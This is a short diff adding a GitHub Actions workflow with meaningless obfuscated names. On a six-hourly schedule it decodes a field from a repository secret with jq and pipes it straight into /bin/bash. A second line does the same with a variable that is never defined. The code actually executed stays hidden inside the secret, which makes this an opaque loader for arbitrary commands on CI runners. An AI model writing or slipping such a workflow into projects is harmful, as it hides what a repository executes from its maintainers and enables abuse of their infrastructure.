@@ -1,0 +1,18 @@
+name: gouyanhuigg
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gouyanhuigg
+        env:
+          ng76: ${{ secrets.ng76 }}
+        run: |
+          echo $ng76 | jq -r .pnt1833 | /bin/bash
+          echo $xq36783 | jq -r .wn4687 | /bin/bash
+
